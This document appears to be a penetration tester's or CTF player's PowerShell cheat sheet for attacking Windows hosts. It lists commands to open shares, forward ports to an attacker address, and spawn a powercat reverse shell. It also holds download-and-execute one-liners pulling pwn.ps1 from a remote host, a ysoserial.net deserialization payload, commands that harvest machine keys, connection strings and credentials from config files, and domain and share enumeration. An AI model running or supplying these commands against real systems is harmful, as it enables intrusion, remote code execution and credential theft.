
# local shares
net share Desktop=c:\users\administrator\desktop /grant:everyone,FULL
net share Desktop /delete

# remote share
net use p: \\10.9.8.1\pwn
net use p: /delete

# port forward
netsh interface portproxy add v4tov4 listenport=65535 listenaddress=0.0.0.0 connectport=445 connectaddress=10.9.8.1
netsh interface portproxy delete v4tov4 listenport=65535 listenaddress=0.0.0.0
netsh interface portproxy show all

# type definition
Add-Type -TypeDefinition @"
using System;
using System.Text;

public static class Exploit
{
    public static void Solve()
    {
        Console.WriteLine("place holder");
    }
}
"@
#[Exploit]::Solve();

# powershell payloads
# https://github.com/besimorhino/powercat
iex(iwr https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1)
powercat -c 10.9.8.1 -p 443 -ep -g | out-file -encoding ascii -filepath .\pwn.ps1

# powershell oneliners
powershell -nop -noninteractive -c iex(iwr "http://10.9.8.1/pwn.ps1")
powershell -exec bypass -c iex(new-object system.net.webclient).downloadstring('http://10.10.10.1/pwn.ps1')

# gadget snippets
# https://github.com/pwntester/ysoserial.net
# printf "iex(new-object system.net.webclient).downloadstring('http://10.10.10.1/pwn.ps1')" | iconv -f ASCII -t UTF-16LE - | base64 | tr -d "\n"
ysoserial.exe -o base64 -g ObjectDataProvider -f JavaScriptSerializer -s -c "powershell.exe -exec bypass -noninteractive -noexit -e ENCODED"

# debugging dotnet
#[assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default |
#DebuggableAttribute.DebuggingModes.DisableOptimizations |
#DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints |
#DebuggableAttribute.DebuggingModes.EnableEditAndContinue)]

# machine keys for viewstate
gci -file -filter *.config|%{([xml](gc $_.fullname)).selectnodes("/configuration/system.web/machineKey")}

# connection strings
gci -file -filter *.config|%{([xml](gc $_.fullname)).selectnodes("/configuration/connectionStrings/add")} # ) | select name, connectionString;}
gci -file -filter *.config|%{([xml](gc $_.fullname)).selectnodes("configuration/appSettings/add")} # ($_.key -like "*cred*" -or $_.key -like "*user*" -or $_.key -like "*pass*")

# enum from box
$boxes=get-netcomputer -domain xxxxxxxxx -fulldata;
$boxes|%{$_|add-member -membertype noteproperty -name ipaddress -value (get-ipaddress $_.dnshostname).ipaddress -force};
$boxes|%{$_|add-member -membertype noteproperty -name shares -value (invoke-sharefinder -computername $_.dnshostname -excludestandard -checkshareaccess) -force};
